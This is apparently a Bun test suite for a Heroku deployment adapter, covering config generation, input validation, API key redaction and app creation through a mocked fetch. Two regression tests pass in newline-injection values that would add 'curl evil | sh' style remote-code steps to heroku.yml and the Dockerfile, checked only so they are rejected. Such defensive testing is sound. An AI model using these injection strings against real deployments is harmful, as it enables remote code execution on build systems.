import { afterEach, describe, expect, test } from "bun:test";
import {
  HEROKU_DEFAULT_API_BASE,
  HEROKU_TARGET_SHAPES,
  HerokuAdapterError,
  appJsonFor,
  deployToHeroku,
  herokuDockerfileFor,
  herokuYmlFor,
  isHerokuTargetShape,
  scrubApiKey,
} from "./index";

const API_KEY_ENV = "HEROKU_API_KEY";

describe("isHerokuTargetShape", () => {
  test("accepts daemon shapes", () => {
    for (const shape of HEROKU_TARGET_SHAPES) {
      expect(isHerokuTargetShape(shape)).toBe(true);
    }
  });
  test("rejects one-shot shapes", () => {
    for (const shape of ["cli", "workflow", "eval", "graph", "pipeline", "crew", "research"]) {
      expect(isHerokuTargetShape(shape)).toBe(false);
    }
  });
});

describe("herokuYmlFor", () => {
  test("web shape gets web process", () => {
    const yml = herokuYmlFor({ target: "channel" });
    expect(yml).toContain("build:");
    expect(yml).toContain("docker:");
    expect(yml).toContain("web: Dockerfile.heroku");
    expect(yml).toContain("run:");
    expect(yml).toContain("web: bun run start");
  });

  test("batch shape gets worker process", () => {
    const yml = herokuYmlFor({ target: "batch" });
    expect(yml).toContain("worker: Dockerfile.heroku");
    expect(yml).toContain("worker: bun run start");
    expect(yml).not.toContain("web:");
  });

  test("respects dockerfile path override", () => {
    const yml = herokuYmlFor({ target: "channel", dockerfilePath: "Dockerfile.prod" });
    expect(yml).toContain("web: Dockerfile.prod");
  });

  test("rejects unsupported shapes", () => {
    expect(() => herokuYmlFor({ target: "cli" })).toThrow(HerokuAdapterError);
  });

  // Regression: a `dockerfilePath` containing a newline could inject arbitrary
  // top-level YAML sections (e.g. a `release:` block Heroku would execute).
  test("rejects dockerfile path with newline injection", () => {
    expect(() =>
      herokuYmlFor({
        target: "channel",
        dockerfilePath: "Dockerfile\nrelease:\n  command: ['curl evil | sh']",
      }),
    ).toThrow(HerokuAdapterError);
  });

  test("rejects dockerfile path with control character", () => {
    expect(() => herokuYmlFor({ target: "channel", dockerfilePath: "Dockerfile\t" })).toThrow(
      HerokuAdapterError,
    );
  });

  test("rejects empty dockerfile path", () => {
    expect(() => herokuYmlFor({ target: "channel", dockerfilePath: "" })).toThrow(
      HerokuAdapterError,
    );
  });
});

describe("appJsonFor", () => {
  test("emits container stack with formation", () => {
    const parsed = JSON.parse(appJsonFor({ target: "channel", name: "my-bot" }));
    expect(parsed.stack).toBe("container");
    expect(parsed.name).toBe("my-bot");
    expect(parsed.formation.web).toEqual({ quantity: 1, size: "basic" });
  });

  test("worker shape gets worker formation", () => {
    const parsed = JSON.parse(appJsonFor({ target: "batch", name: "my-worker" }));
    expect(parsed.formation.worker).toEqual({ quantity: 1, size: "basic" });
    expect(parsed.formation.web).toBeUndefined();
  });

  test("env vars are sorted deterministically", () => {
    const a = appJsonFor({
      target: "channel",
      name: "my-bot",
      envVars: {
        ZETA: { value: "1" },
        ALPHA: { value: "2" },
      },
    });
    const b = appJsonFor({
      target: "channel",
      name: "my-bot",
      envVars: {
        ALPHA: { value: "2" },
        ZETA: { value: "1" },
      },
    });
    expect(a).toBe(b);
    expect(a.indexOf('"ALPHA"')).toBeLessThan(a.indexOf('"ZETA"'));
  });

  // An env-var entry that is explicitly `undefined` (only reachable from
  // untyped JS callers) is skipped rather than serialized.
  test("skips undefined env-var entries", () => {
    const out = appJsonFor({
      target: "channel",
      name: "my-bot",
      envVars: {
        KEEP: { value: "1" },
        DROP: undefined as unknown as { value?: string },
      },
    });
    const parsed = JSON.parse(out);
    expect(parsed.env).toEqual({ KEEP: { value: "1" } });
    expect(parsed.env.DROP).toBeUndefined();
  });

  // When no env vars survive filtering, the `env` key is omitted entirely.
  test("omits env key when no env vars provided", () => {
    const parsed = JSON.parse(appJsonFor({ target: "channel", name: "my-bot" }));
    expect(parsed.env).toBeUndefined();
  });

  test("includes description when provided", () => {
    const parsed = JSON.parse(
      appJsonFor({ target: "channel", name: "my-bot", description: "a demo bot" }),
    );
    expect(parsed.description).toBe("a demo bot");
  });

  test("respects dyno size and quantity", () => {
    const parsed = JSON.parse(
      appJsonFor({
        target: "channel",
        name: "my-bot",
        dynoSize: "performance-m",
        quantity: 3,
      }),
    );
    expect(parsed.formation.web.size).toBe("performance-m");
    expect(parsed.formation.web.quantity).toBe(3);
  });

  test("rejects invalid app names", () => {
    expect(() => appJsonFor({ target: "channel", name: "MyBot" })).toThrow(HerokuAdapterError);
    expect(() => appJsonFor({ target: "channel", name: "ab" })).toThrow(HerokuAdapterError);
    expect(() => appJsonFor({ target: "channel", name: "1starts-with-digit" })).toThrow(
      HerokuAdapterError,
    );
    expect(() => appJsonFor({ target: "channel", name: "trailing-" })).toThrow(HerokuAdapterError);
  });

  test("rejects unsupported shapes", () => {
    expect(() => appJsonFor({ target: "cli", name: "my-bot" })).toThrow(HerokuAdapterError);
  });
});

describe("herokuDockerfileFor", () => {
  test("binds to runtime PORT", () => {
    const df = herokuDockerfileFor({ target: "channel", baseImage: "crewhaus/channel:0.1.0" });
    expect(df).toContain("FROM crewhaus/channel:0.1.0");
    expect(df).toContain("ENV PORT=${PORT:-8080}");
    expect(df).not.toContain("EXPOSE");
  });

  test("rejects unsupported shapes", () => {
    expect(() => herokuDockerfileFor({ target: "cli", baseImage: "x" })).toThrow(
      HerokuAdapterError,
    );
  });

  // Regression: a `baseImage` containing a newline could inject arbitrary
  // Dockerfile instructions (e.g. a `RUN` directive executed at build time).
  test("rejects base image with newline injection", () => {
    expect(() =>
      herokuDockerfileFor({
        target: "channel",
        baseImage: "crewhaus/channel:0.1.0\nRUN curl evil.example | sh",
      }),
    ).toThrow(HerokuAdapterError);
  });

  test("rejects base image with control character", () => {
    expect(() =>
      herokuDockerfileFor({ target: "channel", baseImage: "crewhaus/channel:0.1.0\t" }),
    ).toThrow(HerokuAdapterError);
  });

  test("rejects empty base image", () => {
    expect(() => herokuDockerfileFor({ target: "channel", baseImage: "" })).toThrow(
      HerokuAdapterError,
    );
  });
});

describe("scrubApiKey", () => {
  test("redacts the key", () => {
    expect(scrubApiKey("auth hrk_abcdefghij12345 denied", "hrk_abcdefghij12345")).toBe(
      "auth [REDACTED:HEROKU_API_KEY] denied",
    );
  });
  test("ignores short keys", () => {
    expect(scrubApiKey("untouched", "abc")).toBe("untouched");
  });
  test("passes through when key is undefined", () => {
    expect(scrubApiKey("untouched", undefined)).toBe("untouched");
  });
});

describe("deployToHeroku", () => {
  const ORIGINAL_KEY = process.env[API_KEY_ENV];
  afterEach(() => {
    if (ORIGINAL_KEY === undefined) delete process.env[API_KEY_ENV];
    else process.env[API_KEY_ENV] = ORIGINAL_KEY;
  });

  test("creates an app with container stack", async () => {
    let observed: { url: string; init: RequestInit } | undefined;
    const fetchImpl = (async (url: string | URL, init?: RequestInit) => {
      observed = { url: String(url), init: init ?? {} };
      return new Response(
        JSON.stringify({
          id: "app-uuid-123",
          name: "my-bot",
          web_url: "https://my-bot.herokuapp.com/",
        }),
        { status: 201 },
      );
    }) as unknown as typeof fetch;
    const record = await deployToHeroku({
      appName: "my-bot",
      apiKey: "hrk_testkey_abcdef",
      fetchImpl,
    });
    expect(observed?.url).toBe(`${HEROKU_DEFAULT_API_BASE}/apps`);
    const body = JSON.parse(String(observed?.init.body));
    expect(body.stack).toBe("container");
    expect(body.region).toBe("us");
    expect((observed?.init.headers as Record<string, string>)["Accept"]).toBe(
      "application/vnd.heroku+json; version=3",
    );
    expect(record.appId).toBe("app-uuid-123");
    expect(record.appName).toBe("my-bot");
    expect(record.webUrl).toBe("https://my-bot.herokuapp.com/");
  });

  test("respects region override", async () => {
    let body: Record<string, unknown> = {};
    const fetchImpl = (async (_url: string | URL, init?: RequestInit) => {
      body = JSON.parse(String(init?.body));
      return new Response(JSON.stringify({ id: "x", name: "my-bot" }), { status: 201 });
    }) as unknown as typeof fetch;
    await deployToHeroku({
      appName: "my-bot",
      region: "eu",
      apiKey: "hrk_testkey_abcdef",
      fetchImpl,
    });
    expect(body["region"]).toBe("eu");
  });

  // Custom apiBaseUrl is honored (also documents the SSRF surface: callers
  // own the base URL, so it must come from trusted config).
  test("respects custom apiBaseUrl", async () => {
    let observedUrl = "";
    const fetchImpl = (async (url: string | URL) => {
      observedUrl = String(url);
      return new Response(JSON.stringify({ id: "x", name: "my-bot" }), { status: 201 });
    }) as unknown as typeof fetch;
    await deployToHeroku({
      appName: "my-bot",
      apiKey: "hrk_testkey_abcdef",
      apiBaseUrl: "https://api.heroku.example",
      fetchImpl,
    });
    expect(observedUrl).toBe("https://api.heroku.example/apps");
  });

  test("uses HEROKU_API_KEY env var when apiKey not passed", async () => {
    process.env[API_KEY_ENV] = "hrk_env_key_abcdef";
    let authHeader = "";
    const fetchImpl = (async (_url: string | URL, init?: RequestInit) => {
      authHeader = (init?.headers as Record<string, string>)["Authorization"] ?? "";
      return new Response(JSON.stringify({ id: "x", name: "my-bot" }), { status: 201 });
    }) as unknown as typeof fetch;
    await deployToHeroku({ appName: "my-bot", fetchImpl });
    expect(authHeader).toBe("Bearer hrk_env_key_abcdef");
  });

  test("scrubs API key from error bodies", async () => {
    const fetchImpl = (async () =>
      new Response("unauthorized — key hrk_leakingkey_full denied", {
        status: 401,
        statusText: "Unauthorized",
      })) as unknown as typeof fetch;
    let caught: Error | undefined;
    try {
      await deployToHeroku({
        appName: "my-bot",
        apiKey: "hrk_leakingkey_full",
        fetchImpl,
      });
    } catch (err) {
      caught = err as Error;
    }
    expect(caught?.message).not.toContain("hrk_leakingkey_full");
    expect(caught?.message).toContain("[REDACTED:HEROKU_API_KEY]");
  });

  // The transport-level failure path (fetch rejects) must also scrub the key.
  test("scrubs API key from transport errors", async () => {
    const fetchImpl = (async () => {
      throw new Error("connect ECONNREFUSED while using Bearer hrk_leakingkey_full");
    }) as unknown as typeof fetch;
    let caught: Error | undefined;
    try {
      await deployToHeroku({
        appName: "my-bot",
        apiKey: "hrk_leakingkey_full",
        fetchImpl,
      });
    } catch (err) {
      caught = err as Error;
    }
    expect(caught).toBeInstanceOf(HerokuAdapterError);
    expect(caught?.message).toContain("Heroku Platform API request failed");
    expect(caught?.message).not.toContain("hrk_leakingkey_full");
    expect(caught?.message).toContain("[REDACTED:HEROKU_API_KEY]");
  });

  // Non-Error throw value from the transport is stringified, not crashed on.
  test("handles non-Error transport rejection", async () => {
    const fetchImpl = (async () => {
      throw "string failure";
    }) as unknown as typeof fetch;
    let caught: Error | undefined;
    try {
      await deployToHeroku({
        appName: "my-bot",
        apiKey: "hrk_testkey_abcdef",
        fetchImpl,
      });
    } catch (err) {
      caught = err as Error;
    }
    expect(caught).toBeInstanceOf(HerokuAdapterError);
    expect(caught?.message).toContain("string failure");
  });

  test("throws clearly when no API key configured", async () => {
    delete process.env[API_KEY_ENV];
    let caught: Error | undefined;
    try {
      await deployToHeroku({ appName: "my-bot" });
    } catch (err) {
      caught = err as Error;
    }
    expect(caught).toBeInstanceOf(HerokuAdapterError);
    expect(caught?.message).toContain("HEROKU_API_KEY is required");
  });

  // An empty-string env var is treated the same as a missing one.
  test("throws when HEROKU_API_KEY is empty", async () => {
    process.env[API_KEY_ENV] = "";
    let caught: Error | undefined;
    try {
      await deployToHeroku({ appName: "my-bot" });
    } catch (err) {
      caught = err as Error;
    }
    expect(caught).toBeInstanceOf(HerokuAdapterError);
    expect(caught?.message).toContain("HEROKU_API_KEY is required");
  });

  test("validates app name before network call", async () => {
    let called = false;
    const fetchImpl = (async () => {
      called = true;
      return new Response("", { status: 201 });
    }) as unknown as typeof fetch;
    let caught: Error | undefined;
    try {
      await deployToHeroku({
        appName: "BadCaps",
        apiKey: "hrk_testkey_abcdef",
        fetchImpl,
      });
    } catch (err) {
      caught = err as Error;
    }
    expect(caught).toBeInstanceOf(HerokuAdapterError);
    expect(called).toBe(false);
  });

  test("derives web_url when API omits it", async () => {
    const fetchImpl = (async () =>
      new Response(JSON.stringify({ id: "x", name: "my-bot" }), {
        status: 201,
      })) as unknown as typeof fetch;
    const record = await deployToHeroku({
      appName: "my-bot",
      apiKey: "hrk_testkey_abcdef",
      fetchImpl,
    });
    expect(record.webUrl).toBe("https://my-bot.herokuapp.com/");
  });

  // Body that parses as JSON but lacks id/name is rejected (scrubbed).
  test("rejects JSON response missing id/name", async () => {
    const fetchImpl = (async () =>
      new Response(JSON.stringify({ message: "created but weird" }), {
        status: 201,
      })) as unknown as typeof fetch;
    let caught: Error | undefined;
    try {
      await deployToHeroku({
        appName: "my-bot",
        apiKey: "hrk_testkey_abcdef",
        fetchImpl,
      });
    } catch (err) {
      caught = err as Error;
    }
    expect(caught).toBeInstanceOf(HerokuAdapterError);
    expect(caught?.message).toContain("missing id/name");
  });

  // A 2xx response whose body is not JSON surfaces a clear parse error.
  test("rejects non-JSON success body", async () => {
    const fetchImpl = (async () =>
      new Response("<html>not json</html>", { status: 201 })) as unknown as typeof fetch;
    let caught: Error | undefined;
    try {
      await deployToHeroku({
        appName: "my-bot",
        apiKey: "hrk_testkey_abcdef",
        fetchImpl,
      });
    } catch (err) {
      caught = err as Error;
    }
    expect(caught).toBeInstanceOf(HerokuAdapterError);
    expect(caught?.message).toContain("non-JSON body");
  });
});
